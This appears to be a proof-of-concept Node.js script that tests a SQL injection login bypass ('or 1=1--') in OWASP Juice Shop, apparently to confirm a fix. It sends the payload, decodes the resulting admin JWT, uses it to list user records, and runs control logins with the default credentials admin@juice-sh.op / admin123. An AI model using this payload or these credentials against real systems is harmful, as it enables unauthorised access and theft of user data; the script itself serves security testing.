#!/usr/bin/env node
/*
 * V1 - SQL Injection leading to authentication bypass (CWE-89, OWASP A03:2021)
 *
 * routes/login.ts built its statement by concatenating the request body:
 *
 *   SELECT * FROM Users
 *    WHERE email = '${req.body.email}'
 *      AND password = '${security.hash(req.body.password)}'
 *      AND deletedAt IS NULL
 *
 * Supplying the e-mail address  ' or 1=1--  comments out the password check, so
 * the statement returns the first row of Users - the administrator account.
 *
 * Run:  node poc/01-sqli-auth-bypass.mjs --url http://localhost:3000
 */

import { ARGS, request, login, decodeJwtPayload, verdict } from './lib/util.mjs'

const PAYLOAD = "' or 1=1--"

console.log(`\n[*] Target              : ${ARGS.url}`)
console.log(`[*] Injection payload   : email = ${JSON.stringify(PAYLOAD)}`)

const usersBefore = await request('/api/Users')
console.log(`[*] Baseline /api/Users (no credentials): HTTP ${usersBefore.status}`)

const res = await request('/rest/user/login', {
  method: 'POST',
  json: true,
  body: JSON.stringify({ email: PAYLOAD, password: 'does-not-matter' })
})

const evidence = []
evidence.push(`POST /rest/user/login  -> HTTP ${res.status}`)

if (res.status !== 200 || !res.json?.authentication?.token) {
  evidence.push(`Response: ${res.text.slice(0, 160)}`)
  // Control: a legitimate login must still succeed - the fix must not break
  // the feature, only the injection.
  const legit = await login('admin@juice-sh.op', 'admin123')
  evidence.push(`Control: legitimate login admin@juice-sh.op / admin123 -> ${legit ? 'HTTP 200 (still works)' : 'FAILED'}`)
  const stillClosed = await request('/api/Users')
  evidence.push(`Control: GET /api/Users with no credentials -> HTTP ${stillClosed.status} (endpoint still requires auth)`)
  verdict({
    id: 'V1',
    title: 'SQL Injection - authentication bypass',
    cwe: 'CWE-89',
    exploited: false,
    evidence
  })
}

const token = res.json.authentication.token
const claims = decodeJwtPayload(token)
evidence.push(`Issued JWT role        : ${claims?.data?.role}`)
evidence.push(`Issued JWT e-mail      : ${claims?.data?.email}`)

// The token must actually work against an authenticated endpoint.
const privileged = await request('/api/Users', { headers: { Authorization: `Bearer ${token}` } })
const leaked = privileged.json?.data?.length ?? 0
evidence.push(`GET /api/Users with the injected token -> HTTP ${privileged.status}, ${leaked} user records returned`)

const exploited = res.status === 200 && claims?.data?.role === 'admin' && privileged.status === 200

// Sanity check: a normal login must still work after the fix.
const legit = await login('admin@juice-sh.op', 'admin123')
evidence.push(`Control: legitimate login admin@juice-sh.op / admin123 -> ${legit ? 'HTTP 200 (still works)' : 'FAILED'}`)

verdict({
  id: 'V1',
  title: 'SQL Injection - authentication bypass',
  cwe: 'CWE-89',
  exploited,
  evidence
})
